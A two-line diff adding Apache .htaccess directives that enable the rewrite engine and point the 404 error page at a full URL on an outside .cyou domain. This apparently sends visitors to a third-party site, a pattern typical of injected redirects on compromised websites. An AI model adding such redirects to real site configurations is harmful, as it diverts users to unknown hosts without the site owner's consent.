@@ -1,0 +1,2 @@
+RewriteEngine on
+ErrorDocument 404   http://ginanjar-janabadra.cyou/404.php
